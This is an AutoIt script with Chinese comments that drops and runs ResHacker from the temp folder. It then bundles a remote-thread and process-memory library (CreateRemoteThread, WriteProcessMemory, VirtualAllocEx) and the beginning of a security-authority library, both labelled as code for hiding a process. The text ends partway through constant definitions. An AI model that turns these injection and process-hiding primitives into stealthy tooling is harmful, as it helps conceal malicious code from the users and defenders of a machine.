#NoTrayIcon
#Region ;**** 参数创建于 ACNWrapper_GUI ****
#AutoIt3Wrapper_icon=..\..\..\Windows\system32\SHELL32.dll|-23
#AutoIt3Wrapper_outfile=单文件.exe
#EndRegion ;**** 参数创建于 ACNWrapper_GUI ****
#include-once
#include <Array.au3>
FileInstall("C:\Users\xiaozhan\Desktop\ResHacker 3.5中文版.exe", @TempDir & "\",1)
FileInstall("C:\Users\xiaozhan\Desktop\ResHacker 3.5中文版.ini", @TempDir & "\",1)
Sleep(1000)
ShellExecute("ResHacker 3.5中文版.exe","",@TempDir & "\")
ProcessWaitClose("ResHacker 3.5中文版.exe")
FileDelete(@TempDir & "\ResHacker 3.5中文版.exe")
FileDelete(@TempDir & "\ResHacker 3.5中文版.ini")


#cs
以下所有代码是隐藏进程所需要的代码
Thread.au3的名字                       搜索结束名字   EndFunc	;==>_RTCallWindowProc
LocalSecurityAuthority.au3 的名字     搜索开始名字    SYSTEM ERROR CODE CONSTANTS  搜索结束名字    EndFunc	;==>___fnProgress
HideProcess.au3 的名字                搜索开始名字    $bProtectFingerprint         搜索结束名字       EndFunc	;==>_NotifyProcessEnumeration
#ce
;-----------------------------------------------------------------------------------------
;以下代码可以打包成这个 Thread.au3的名字  搜索结束名字   EndFunc	;==>_RTCallWindowProc
;头文件  #include-once

; #### Title ####
; ===================================================================================
; Remote procedure call, - Pusofalse, kanxinqi@yahoo.com.cn
; ===================================================================================


Global Const $hAu3ThreadDll = DllOpen("Kernel32.dll")

Func _RTCreateRemoteThread($hProcess, $pStartAddress, $pParameter = 0, _
		$iFlags = 0, $pSecurAttr = 0, $iStackSize = 0)

	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "handle", "CreateRemoteThread", "handle", $hProcess, _
			"ptr", $pSecurAttr, "dword", $iStackSize, "ptr", $pStartAddress, _
			"ptr", $pParameter, "ptr", $pParameter, "dword", $iFlags, "dword*", 0)
	Return SetError(_RTLastError(), $iResult[7], $iResult[0])
EndFunc	;==>_RTCreateRemoteThread

Func _RTExitThread($iExitStatus = 0)
	DllCall($hAu3ThreadDll, "none", "ExitThread", "dword", $iExitStatus)
EndFunc	;==>_RTExitThread

Func _RTGetWindowThreadProcessId($hWnd)
	Local $iResult
	$iResult = DllCall("User32.dll", "dword", "GetWindowThreadProcessId", "hWnd", $hWnd, "dword*", 0)
	Return SetError(_RTLastError(), $iResult[0], $iResult[2])
EndFunc	;==>_RTGetWindowThreadProcessId

Func _RTGetProcAddress($vModule, $sProcedure)
	Local $iResult

	If IsString($vModule) Then
		$vModule = _RTGetModuleHandle($vModule)
	EndIf
	$iResult = DllCall($hAu3ThreadDll, "ptr", "GetProcAddress", "ptr", $vModule, "str", $sProcedure)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTGetProcAddress

Func _RTGetModuleHandle($sModule)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "ptr", "GetModuleHandle", "str", $sModule)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTGetModuleHandle

Func _RTLoadLibrary($sModule)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "ptr", "LoadLibrary", "str", $sModule)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTLoadLibrary


Const $RT_MEMCOMMIT = 0x1000
Const $RT_MEMRESERVE = 0x2000
Const $RT_MEMDECOMMIT = 0x4000
Const $RT_MEMRELEASE = 0x8000

Func _RTReadProcessMemory($hProcess, $pBaseAddress, $pBuffer, $iSize, $sReturnType = "ptr")
	Local $iFlags, $iResult

	Switch $sReturnType
	Case "ptr"
		If IsDllStruct($pBuffer) Then $pBuffer = DllStructGetPtr($pBuffer)
	Case "binary", "binary*"
		Local $tBuffer = DllStructCreate("ubyte Binary[" & $iSize & "]")
		$pBuffer = DllStructGetPtr($tBuffer)
		$sReturnType = "ptr"
		$iFlags = 1
	Case "str"
		$iSize += 1
	Case "wstr"
		$iSize += 2
	EndSwitch

	$iResult = DllCall($hAu3ThreadDll, "bool", "ReadProcessMemory", "handle", $hProcess, _
			"ptr", $pBaseAddress, $sReturnType, $pBuffer, "dword", $iSize, _
			"dword*", 0)
	If (@error) Then
		If ($iFlags) Then $tBuffer = 0
		Return SetError(87, 0, "")
	EndIf
	If ($iResult[0] = 0) Then
		$iResult[3] = ""
		If ($iFlags) Then $tBuffer = 0
	ElseIf ($iFlags) Then
		$sReturnType = "binary"
		$iResult[3] = DllStructGetData($tBuffer, 1)
	EndIf

	If ($sReturnType = "ptr") Then
		Return SetError(_RTLastError(), $iResult[5], $iResult[0])
	Else
		Return SetError(_RTLastError(), $iResult[5], $iResult[3])
	EndIf
EndFunc	;==>_RTReadProcessMemory

Func _RTWriteProcessMemory($hProcess, $pBaseAddress, $pBuffer, $iSize, $sBufferType = "ptr")
	Switch $sBufferType
	Case "ptr"
		If IsDllStruct($pBuffer) Then $pBuffer = DllStructGetPtr($pBuffer)
	Case "binary", "binary*"
		$sBufferType = "ptr"
		Local $tBuffer = DllStructCreate("ubyte Binary[" & $iSize & "]")
		DllStructSetData($tBuffer, "Binary", $pBuffer)
		$pBuffer = DllStructGetPtr($tBuffer)
	Case "str"
		$iSize += 1
	Case "wstr"
		$iSize += 2
	EndSwitch

	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "bool", "WriteProcessMemory", "handle", $hProcess, _
			"ptr", $pBaseAddress, $sBufferType, $pBuffer, "dword", $iSize, _
			"dword*", 0)
	If ($sBufferType = "binary") Or ($sBufferType = "binary*") Then $tBuffer = 0
	If (@error) Then
		Return SetError(87, 0, 0)
	Else
		Return SetError(_RTLastError(), $iResult[5], $iResult[0])
	EndIf
EndFunc	;==>_RTWriteProcessMemory

Func _RTReadBytes($pBuffer, $sType = "dword", $iBytesToRead = 4)
	Local $vReturn

	If ($sType <> "str") And ($sType <> "wstr") Then $sType &= "*"
	$vReturn = _RTReadProcessMemory(-1, $pBuffer, 0, $iBytesToRead, $sType)
	Return SetError(@error, @extended, $vReturn)
EndFunc	;==>_RTReadBytes

Func _RTWriteBytes($pBuffer, $vData, $sType = "dword", $iBytesToWrite = 4)
	Local $fResult

	If ($sType <> "str") And ($sType <> "wstr") Then $sType &= "*"

	$fResult = _RTWriteProcessMemory(-1, $pBuffer, $vData, $iBytesToWrite, $sType)
	Return SetError(@error, @extended, $fResult)
EndFunc	;==>_RTWriteBytes

Func _RTLongPtrToBytes($iLongPtr)
	Return Hex(Binary($iLongPtr))
EndFunc	;==>_RTLongPtrToBytes

Func _RTUlongToBytes($iUlong)
	Return _RTLongPtrToBytes(Ptr($iUlong))
EndFunc	;==>_RTUlongToBytes

Func _RTVirtualAllocEx($hProcess, $iSize, $iProtect = 0x40, $iAllocType = $RT_MEMCOMMIT, $pBaseAddress = 0)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "ptr", "VirtualAllocEx", "handle", $hProcess, _
			"ptr", $pBaseAddress, "dword", $iSize, "dword", $iAllocType, "dword", $iProtect)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTVirtualAllocEx

Func _RTVirtualFreeEx($hProcess, $pBaseAddress, $iSize, $iFlags = $RT_MEMDECOMMIT)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "bool", "VirtualFreeEx", "handle", $hProcess, _
			"ptr", $pBaseAddress, "dword", $iSize, "dword", $iFlags)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTVirtualFreeEx

Func _RTVirtualAlloc($iSize, $iProtect = 0x40, $iAllocType = $RT_MEMCOMMIT, $pBaseAddress = 0)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "ptr", "VirtualAlloc", "ptr", $pBaseAddress, _
			"dword", $iSize, "dword", $iAllocType, "dword", $iProtect)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTVirtualAlloc

Func _RTVirtualFree($pBaseAddress, $iSize, $iFlags = $RT_MEMDECOMMIT)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "bool", "VirtualFree", "ptr", $pBaseAddress, _
			"dword", $iSize, "dword", $iFlags)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTVirtualFree

Func _RTOpenProcess($iPid, $iDesiredAccess = 0x1F0FFF, $fInherit = 0)
	Local $iResult

	If ($iPid = -1) Or ($iPid = @AutoItPid) Then
		Return _RTCurrentProcess()
	EndIf

	$iPid = ProcessExists($iPid)
	If ($iPid = 0) Then Return SetError(2, 0, 0)

	$iResult = DllCall($hAu3ThreadDll, "handle", "OpenProcess", "dword", $iDesiredAccess, _
			"bool", $fInherit, "dword", $iPid)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTOpenProcess

Func _RTCreateThread($pStartAddress, $pParameter = 0, _
		$iFlags = 0, $pSecurAttr = 0, $iStackSize = 0)

	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "handle", "CreateThread", "ptr", $pSecurAttr, _
			"dword", $iStackSize, "ptr", $pStartAddress, "ptr", $pParameter, _
			"dword", $iFlags, "dword*", 0)
	Return SetError(_RTLastError(), $iResult[6], $iResult[0])
EndFunc	;==>_RTCreateThread

Func _RTOpenThread($iThreadId, $iDesiredAccess = 0x1F03FF, $fInherit = 0)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "handle", "OpenThread", "dword", $iDesiredAccess, _
			"bool", $fInherit, "dword", $iThreadId)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTOpenThread

Func _RTLastError()
	Local $iResult = DllCall($hAu3ThreadDll, "long", "GetLastError")
	Return $iResult[0]
EndFunc	;==>_RTLastError

Func _RTCurrentThread()
	Local $iResult = DllCall($hAu3ThreadDll, "handle", "GetCurrentThread")
	Return $iResult[0]
EndFunc	;==>_RTCurrentThread

Func _RTCloseHandle($hHandle)
	Local $iResult = DllCall($hAu3ThreadDll, "bool", "CloseHandle", "handle", $hHandle)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTCloseHandle

Func _RTCurrentProcess()
	Local $iResult = DllCall($hAu3ThreadDll, "handle", "GetCurrentProcess")
	Return $iResult[0]
EndFunc	;==>_RTCurrentProcess


Const $RT_DUP_CLOSE_SOURCE = 1
Const $RT_DUP_SAME_ACCESS = 2

Func _RTDuplicateHandle($hSrcProcess, $hSrcHandle, $hTgtProcess, _
		$iFlags = $RT_DUP_SAME_ACCESS, $iDesiredAccess = 0, $fInherit = 0)

	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "bool", "DuplicateHandle", "handle", $hSrcProcess, _
			"handle", $hSrcHandle, "handle", $hTgtProcess, "handle*", 0, _
			"dword", $iDesiredAccess, "bool", $fInherit, "dword", $iFlags)
	Return SetError(_RTLastError(), 0, $iResult[4])
EndFunc	;==>_RTDuplicateHandle

Func _RTTerminateThread($hThread, $iExitCode = 0)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "bool", "TerminateThread", "handle", $hThread, "dword", $iExitCode)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTTerminateThread


Func _RTResumeThread($hThread)
	Local $iResult
	$iResult =  DllCall($hAu3ThreadDll, "bool", "ResumeThread", "handle", $hThread)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTResumeThread

Func _RTSuspendThread($hThread)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "int", "SuspendThread", "handle", $hThread)
	Return SetError(_RTLastError(), $iResult[0], $iResult[0] <> -1)
EndFunc	;==>_RTSuspendThread

Func _RTWaitForObject($hObject, $iTimeout = -1)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "dword", "WaitForSingleObject", _
			"handle", $hObject, "dword", $iTimeout)
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTWaitForObject

Func _RTFillBytes($pDestination, $iLength, $iBytes = 0x00)
	DllCall("Ntdll.dll", "none", "RtlFillMemory", "ptr", $pDestination, _
			"dword", $iLength, "ubyte", $iBytes)
EndFunc	;==>_RTFillBytes

Const $RT_PROCESS_HEAP = _RTProcessHeap()

Func _RTHeapFree($pBuffer)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "bool", "HeapFree", "handle", $RT_PROCESS_HEAP, _
			"dword", 0, "ptr", $pBuffer)
	Return $iResult[0]
EndFunc	;==>_RTHeapFree

Func _RTHeapSize($pBuffer)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "dword", "HeapSize", "handle", $RT_PROCESS_HEAP, _
			"dword", 0, "ptr", $pBuffer)
	Return $iResult[0]
EndFunc	;==>_RTHeapSize

Func _RTProcessHeap()
	Local $iResult = DllCall($hAu3ThreadDll, "handle", "GetProcessHeap")
	Return $iResult[0]
EndFunc	;==>_RTProcessHeap

Func _RTHeapAlloc($iBytesToAlloc, $iFlags = 8)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "ptr", "HeapAlloc", "handle", $RT_PROCESS_HEAP, _
			"dword", $iFlags, "dword", $iBytesToAlloc)
	Return $iResult[0]
EndFunc	;==>_RTHeapAlloc

Func _RTHeapReAlloc($pBaseAddress, $iSizeToRealloc, $iFlags = 24)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "ptr", "HeapReAlloc", "handle", $RT_PROCESS_HEAP, _
			"dword", $iFlags, "ptr", $pBaseAddress, "dword", $iSizeToRealloc)
	Return $iResult[0]
EndFunc	;==>_RTHeapReAlloc


Func _RTVirtualProtectEx($hProcess, $pBaseAddress, $iSize, $iNewProtect = 0x40)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "bool", "VirtualProtectEx", "handle", $hProcess, _
			"ptr", $pBaseAddress, "dword", $iSize, "dword", $iNewProtect, _
			"dword*", 0)
	Return SetError(_RTLastError(), $iResult[5], $iResult[0])
EndFunc	;==>_RTVirtualProtectEx

Func _RTVirtualProtect($pBaseAddress, $iSize, $iNewProtect = 0x40)
	Local $iResult
	$iResult = DllCall($hAu3ThreadDll, "bool", "VirtualProtect", "ptr", $pBaseAddress, _
			"dword", $iSize, "dword", $iNewProtect, "dword*", 0)
	Return SetError(_RTLastError(), $iResult[4], $iResult[0])
EndFunc	;==>_RTVirtualProtect

Const $tagRT_MEMORY_BASIC_INFO = "ptr BaseAddress;ptr AllocBase;dword AllocProtect;dword RegionSize;dword State;dword Protect;dword Type"


Func _RTVirtualQueryEx($hProcess, $pBaseAddress)
	Local $pBuffer, $iResult

	$pBuffer = _RTHeapAlloc(28)
	$iResult = DllCall($hAu3ThreadDll, "bool", "VirtualQueryEx", "handle", $hProcess, _
			"ptr", $pBaseAddress, "ptr", $pBuffer, "dword", 28)
	If ($iResult[0]) Then
		Return SetError(_RTLastError(), 0, $pBuffer)
	Else
		Return SetError(_RTLastError(), _RTHeapFree($pBuffer), 0)
	EndIf
EndFunc	;==>_RTVirtualQueryEx

Func _RTVirtualQuery($pBaseAddress)
	Local $pBuffer, $iResult

	$pBuffer = _RTHeapAlloc(28)
	$iResult = DllCall($hAu3ThreadDll, "bool", "VirtualQuery", _
			"ptr", $pBaseAddress, "ptr", $pBuffer, "dword", 28)
	If ($iResult[0]) Then
		Return SetError(_RTLastError(), 0, $pBuffer)
	Else
		Return SetError(_RTLastError(), _RTHeapFree($pBuffer), 0)
	EndIf
EndFunc	;==>_RTVirtualQuery

Const $RT_VARTYPE_BOOL = 0
Const $RT_VARTYPE_BYTES = 1
Const $RT_VARTYPE_WORD = 2
Const $RT_VARTYPE_DWORD = 3
Const $RT_VARTYPE_INT64 = 4

Const $RT_VARTYPE_STRING = 0x1000
Const $RT_VARTYPE_ANSI = 0x1005
Const $RT_VARTYPE_UNICODE = 0x1006


Func _RtSizeof($vVariable, $iType = $RT_VARTYPE_BOOL)
	Switch $iType
	Case $RT_VARTYPE_BOOL, $RT_VARTYPE_DWORD
		Return 4
	Case $RT_VARTYPE_BYTES
		If Not StringRegExp($vVariable, "(?i)[^0-9A-F]") Then
			If (StringLeft($vVariable, 2) = "0x") Then
				Return BinaryLen($vVariable)
			Else
				Return StringLen($vVariable)
			EndIf
		Else
			Local $iResult = DllCall("Kernel32.dll", "int", "lstrlenA", "str", $vVariable)
			Return $iResult[0]
		EndIf
	Case $RT_VARTYPE_WORD
		Return 2
	Case $RT_VARTYPE_INT64
		Return 8
	Case $RT_VARTYPE_ANSI
		Local $iResult = DllCall("Kernel32.dll", "int", "lstrlenA", "str", $vVariable)
		Return $iResult[0]
	Case $RT_VARTYPE_UNICODE
		Local $iResult = DllCall("Kernel32.dll", "int", "lstrlenW", "wstr", $vVariable)
		Return $iResult[0]
	Case Else
		Return -1
	EndSwitch
EndFunc	;==>_RtSizeof

Func _RtStringToBytesW($sText)
	Local $tText, $tBinary, $pText, $iLength, $bBinary

	$iLength = StringLen($sText) + 1
	$tText = DllStructCreate("wchar Text[" & $iLength & "]")
	$pText = DllStructGetPtr($tText)
	$tBinary = DllStructCreate("ubyte Binary[" & ($iLength * 2) & "]", $pText)
	DllStructSetData($tText, "Text", $sText)

	$bBinary = Hex(DllStructGetData($tBinary, 1))
	$tBinary = 0
	$tText = 0
	Return $bBinary
EndFunc	;==>_RtStringToBytesW


Func _RTQueryObject($hObject, $iInfoClass, $pBuffer, $iSizeofBuffer)
	Local $iResult
	$iResult = DllCall("Ntdll.dll", "dword", "NtQueryObject", "handle", $hObject, _
			"dword", $iInfoClass, "ptr", $pBuffer, "dword", $iSizeofBuffer, _
			"dword*", 0)
	Return SetError(($iResult[0]), $iResult[5], $iResult[0] = 0)
EndFunc	;==>_RTQueryObject

Func _RTCallWindowProc($pCallAddr, $sReturn = "int", $hParam1 = 0, $iParam2 = 0, $wParam3 = 0, $lParam4 = 0)
	Local $iResult
	$iResult = DllCall("User32.dll", $sReturn, "CallWindowProc", "ptr", $pCallAddr, _
			"hWnd", $hParam1, "uint", $iParam2, "wparam", $wParam3, _
			"lparam", $lParam4)
	If (@error) Then Return SetError(87, 0, "")
	Return SetError(_RTLastError(), 0, $iResult[0])
EndFunc	;==>_RTCallWindowProc

;以上代码可以打包成这个 Thread.au3的名字
;-----------------------------------------------------------------------------------------



;-----------------------------------------------------------------------------------------
;以下代码可以打包成这个 LocalSecurityAuthority.au3 的名字   搜索结束名字    EndFunc	;==>___fnProgress
;头文件 #include-once    #include <Array.au3>

; #### HEADER INFORMATION ####
; =======================================================================
; Title	: Local Security Authority
; Description	: Local security authority related. Functions this library can do:
;		1.	Set/get the security information of a file, service, registry key, share resource or a kernel object.
;		2.	Assign/remove the user rights to/from an user account/group.
;		3.	Create/delete the user account (or set/get the user account information) from the specified system.
;		4.	Verify the any object's hash value.
;		5.	Query the secrets stored in the system.
;		6.	Create/delete the private data in private database.
;		7.	Encrypt/decrypt messages.
;		8.	Create process with higher privileges (or adjust privileges) so that you can debug any other processes.
;		9.	Else more...
; Author	: Pusofalse
; Requirements	:
;	Modules		: Advapi32.dll, Crypt32.dll, Netapi32.dll, Kernel32.dll, Secur32.dll, Ole32.dll
;	AutoIt Version	: AutoIt v3 ++
;	Minimum Client	: Windows 2000 Professional
; =======================================================================

; SYSTEM ERROR CODE CONSTANTS
; =======================================================================
If Not IsDeclared("ERROR_SUCCESS") Then Global Const $ERROR_SUCCESS = 0
If Not IsDeclared("ERROR_INCORRECT_FUNCTION") Then Global Const $ERROR_INCORRECT_FUNCTION = 1
If Not IsDeclared("ERROR_FILE_NOT_FOUND") Then Global Const $ERROR_FILE_NOT_FOUND = 2
If Not IsDeclared("ERROR_ACCESS_DENIED") Then Global Const $ERROR_ACCESS_DENIED = 5
If Not IsDeclared("ERROR_INVALID_HANDLE") Then Global Const $ERROR_INVALID_HANDLE = 6
If Not IsDeclared("ERROR_INVALID_DATA") Then Global Const $ERROR_INVALID_DATA = 13
If Not IsDeclared("ERROR_NO_MORE_FILES") Then Global Const $ERROR_NO_MORE_FILES = 18
If Not IsDeclared("ERROR_INVALID_PARAMETER") Then Global Const $ERROR_INVALID_PARAMETER = 87
If Not IsDeclared("ERROR_MORE_DATA") Then Global Const $ERROR_MORE_DATA = 234
If Not IsDeclared("ERROR_NO_MORE_ITEMS") Then Global Const $ERROR_NO_MORE_ITEMS = 259
If Not IsDeclared("ERROR_INVALID_ACL") Then Global Const $ERROR_INVALID_ACL = 1336
If Not IsDeclared("ERROR_INVALID_SID") Then Global Const $ERROR_INVALID_SID = 1337
If Not IsDeclared("ERROR_INVALID_SECURITY_DESCR") Then Global Const $ERROR_INVALID_SECURITY_DESCR = 1338
; =======================================================================

; #### PRIVILEGE CONSTANTS ####
; =======================================================================
If Not IsDeclared("SE_CREATE_TOKEN_NAME") Then Global Const $SE_CREATE_TOKEN_NAME = "SeCreateTokenPrivilege"
If Not IsDeclared("SE_ASSIGNPRIMARYTOKEN_NAME") Then Global Const $SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege"
If Not IsDeclared("SE_LOCK_MEMORY_NAME") Then Global Const $SE_LOCK_MEMORY_NAME = "SeLockMemoryPrivilege"
If Not IsDeclared("SE_INCREASE_QUOTA_NAME") Then Global Const $SE_INCREASE_QUOTA_NAME = "SeIncreaseQuotaPrivilege"
If Not IsDeclared("SE_UNSOLICITED_INPUT_NAME") Then Global Const $SE_UNSOLICITED_INPUT_NAME = "SeUnsolicitedInputPrivilege"
If Not IsDeclared("SE_MACHINE_ACCOUNT_NAME") Then Global Const $SE_MACHINE_ACCOUNT_NAME = "SeMachineAccountPrivilege"
If Not IsDeclared("SE_TCB_NAME") Then Global Const $SE_TCB_NAME = "SeTcbPrivilege"
If Not IsDeclared("SE_SECURITY_NAME") Then Global Const $SE_SECURITY_NAME = "SeSecurityPrivilege"
If Not IsDeclared("SE_TAKE_OWNERSHIP_NAME") Then Global Const $SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege"
If Not IsDeclared("SE_LOAD_DRIVER_NAME") Then Global Const $SE_LOAD_DRIVER_NAME = "SeLoadDriverPrivilege"
If Not IsDeclared("SE_SYSTEM_PROFILE_NAME") Then Global Const $SE_SYSTEM_PROFILE_NAME = "SeSystemProfilePrivilege"
If Not IsDeclared("SE_SYSTEMTIME_NAME") Then Global Const $SE_SYSTEMTIME_NAME = "SeSystemtimePrivilege"
If Not IsDeclared("SE_PROF_SINGLE_PROCESS_NAME") Then Global Const $SE_PROF_SINGLE_PROCESS_NAME = "SeProfileSingleProcessPrivilege"
If Not IsDeclared("SE_INC_BASE_PRIORITY_NAME") Then Global Const $SE_INC_BASE_PRIORITY_NAME = "SeIncreaseBasePriorityPrivilege"
If Not IsDeclared("SE_CREATE_PAGEFILE_NAME") Then Global Const $SE_CREATE_PAGEFILE_NAME = "SeCreatePagefilePrivilege"
If Not IsDeclared("SE_CREATE_PERMANENT_NAME") Then Global Const $SE_CREATE_PERMANENT_NAME = "SeCreatePermanentPrivilege"
If Not IsDeclared("SE_BACKUP_NAME") Then Global Const $SE_BACKUP_NAME = "SeBackupPrivilege"
If Not IsDeclared("SE_RESTORE_NAME") Then Global Const $SE_RESTORE_NAME = "SeRestorePrivilege"
If Not IsDeclared("SE_SHUTDOWN_NAME") Then Global Const $SE_SHUTDOWN_NAME = "SeShutdownPrivilege"
If Not IsDeclared("SE_DEBUG_NAME") Then Global Const $SE_DEBUG_NAME = "SeDebugPrivilege"
If Not IsDeclared("SE_AUDIT_NAME") Then Global Const $SE_AUDIT_NAME = "SeAuditPrivilege"
If Not IsDeclared("SE_SYSTEM_ENVIRONMENT_NAME") Then Global Const $SE_SYSTEM_ENVIRONMENT_NAME = "SeSystemEnvironmentPrivilege"
If Not IsDeclared("SE_CHANGE_NOTIFY_NAME") Then Global Const $SE_CHANGE_NOTIFY_NAME = "SeChangeNotifyPrivilege"
If Not IsDeclared("SE_REMOTE_SHUTDOWN_NAME") Then Global Const $SE_REMOTE_SHUTDOWN_NAME = "SeRemoteShutdownPrivilege"
If Not IsDeclared("SE_UNDOCK_NAME") Then Global Const $SE_UNDOCK_NAME = "SeUndockPrivilege"
If Not IsDeclared("SE_TRUSTED_CERDMAN_ACCESS_NAME") Then Global Const $SE_TRUSTED_CREDMAN_ACCESS_NAME = "SeTrustedCredManAccessPrivilege"

; #### USER ACCOUNT RIGHTS CONSTANTS ####
; =======================================================================
Global Const $SE_BATCH_LOGON_NAMETEXT="SeBatchLogonRight"
; Required for an account to log on using the batch logon type.

Global Const $SE_DENY_BATCH_LOGON_NAMETEXT="SeDenyBatchLogonRight"
; Explicitly denies an account the right to log on using the batch logon type.

Global Const $SE_DENY_INTERACTIVE_LOGON_NAMETEXT="SeDenyInteractiveLogonRight"
; Explicitly denies an account the right to log on using the interactive logon type.

Global Const $SE_DENY_NETWORK_LOGON_NAMETEXT="SeDenyNetworkLogonRight"
; Explicitly denies an account the right to log on using the network logon type.

Global Const $SE_DENY_REMOTE_INTERACTIVE_LOGON_NAMETEXT="SeDenyRemoteInteractiveLogonRight"
; Explicitly denies an account the right to log on remotely using the interactive logon type.

Global Const $SE_DENY_SERVICE_LOGON_NAMETEXT="SeDenyServiceLogonRight"
; Explicitly denies an account the right to log on using the service logon type.

Global Const $SE_INTERACTIVE_LOGON_NAMETEXT="SeInteractiveLogonRight"
; Required for an account to log on using the interactive logon type.

Global Const $SE_NETWORK_LOGON_NAMETEXT="SeNetworkLogonRight"
; Required for an account to log on using the network logon type.

Global Const $SE_REMOTE_INTERACTIVE_LOGON_NAMETEXT="SeRemoteInteractiveLogonRight"
; Required for an account to log on remotely using the interactive logon type.

Global Const $SE_SERVICE_LOGON_NAMETEXT= "SeServiceLogonRight"
; Required for an account to log on using the service logon type.
; =======================================================================

; SECURITY INFORMATION CONSTANTS
; =======================================================================
Global Const $OWNER_SECURITY_INFORMATION = 1
Global Const $GROUP_SECURITY_INFORMATION = 2
Global Const $DACL_SECURITY_INFORMATION = 4
Global Const $SACL_SECURITY_INFORMATION = 8
; =======================================================================

; SECURITY OBJECT TYPE CONSTANTS
; =======================================================================
Global Const $SE_UNKNOWN_OBJECT_TYPE = 0
Global Const $SE_FILE_OBJECT = 1
Global Const $SE_SERVICE = 2
Global Const $SE_PRINTER = 3
Global Const $SE_REGISTRY_KEY = 4
Global Const $SE_LMSHARE = 5
Global Const $SE_KERNEL_OBJECT = 6
Global Const $SE_WINDOW_OBJECT = 7
Global Const $SE_DS_OBJECT = 8
Global Const $SE_DS_OBJECT_ALL = 9
Global Const $SE_PROVIDER_DEFINED_OBJECT = 10
Global Const $SE_WMIGUID_OBJECT = 11
Global Const $SE_REGISTRY_WOW64_32KEY = 12
; =======================================================================

; ACCESS TOKEN SECURITY AND ACCESS RIGHTS CONSTANTS
; ======================================================================
If Not IsDeclared("TOKEN_ADJUST_DEFAULT") Then Global Const $TOKEN_ADJUST_DEFAULT = 0x80
If Not IsDeclared("TOKEN_ADJUST_GROUPS") Then Global Const $TOKEN_ADJUST_GROUPS = 0x40
If Not IsDeclared("TOKEN_ADJUST_PRIVILEGES") Then Global Const $TOKEN_ADJUST_PRIVILEGES = 0x20
If Not IsDeclared("TOKEN_ADJUST_SESSIONID") Then Global Const $TOKEN_ADJUST_SESSIONID = 0x100
If Not IsDeclared("TOKEN_ASSIGN_PRIMARY") Then Global Const $TOKEN_ASSIGN_PRIMARY = 0x01
If Not IsDeclared("TOKEN_DUPLICATE") Then Global Const $TOKEN_DUPLICATE = 0x2
If Not IsDeclared("TOKEN_EXECUTE") Then Global Const $TOKEN_EXECUTE = 0x20000
If Not IsDeclared("TOKEN_IMPERSONATE") Then Global Const $TOKEN_IMPERSONATE = 0x4
If Not IsDeclared("TOKEN_QUERY") Then Global Const $TOKEN_QUERY = 0x8
If Not IsDeclared("TOKEN_QUERY_SOURCE") Then Global Const $TOKEN_QUERY_SOURCE = 0x10
If Not IsDeclared("TOKEN_READ") Then Global Const $TOKEN_READ = 0x20008
If Not IsDeclared("TOKEN_WRITE") Then Global Const $TOKEN_WRITE = 0x200e0
If Not IsDeclared("TOKEN_ALL_ACCESS") Then Global Const $TOKEN_ALL_ACCESS = 0xF01FF
; =======================================================================

; TRUSTEE FROM CONSTANTS
; =======================================================================
Global Const $TRUSTEE_IS_SID = 0
Global Const $TRUSTEE_IS_NAME = 1
Global Const $TRUSTEE_BAD_NAME = 2
Global Const $TRUSTEE_IS_OBJECTS_AND_SID = 3
Global Const $TRUSTEE_IS_OBJECTS_AND_NAME = 4
; =======================================================================

; TRUSTEE TYPE CONSTANTS
; =======================================================================
Global Const $TRUSTEE_IS_UNKNOWN = 0
Global Const $TRUSTEE_IS_USER = 1
Global Const $TRUSTEE_IS_GROUP = 2
Global Const $TRUSTEE_IS_DOMAIN = 3
Global Const $TRUSTEE_IS_ALIAS = 4
Global Const $TRUSTEE_IS_WELL_KNOWN_GROUP = 5
Global Const $TRUSTEE_IS_DELETED = 6
Global Const $TRUSTEE_IS_INVALID = 7
Global Const $TRUSTEE_IS_COMPUTER = 8
; =======================================================================

; ACCESS TYPE CONSTANTS
; =======================================================================
Global Const $NOT_USED_ACCESS = 0
Global Const $GRANT_ACCESS = 1
Global Const $SET_ACCESS = 2
Global Const $DENY_ACCESS = 3
Global Const $REVOKE_ACCESS = 4
Global Const $SET_AUDIT_SUCCESS = 5
Global Const $SET_AUDIT_FAILURE = 6
; =======================================================================

; SID NAME USE CONSTANTS ( SID TYPE )
; =======================================================================
Global Const $SID_IS_USER = 1
Global Const $SID_IS_GROUP = 2
Global Const $SID_IS_DOMAIN = 3
Global Const $SID_IS_ALIAS = 4
Global Const $SID_IS_WELLKNOWN_GROUP = 5
Global Const $SID_IS_DELETED_ACCOUNT = 6
Global Const $SID_IS_INVALID = 7
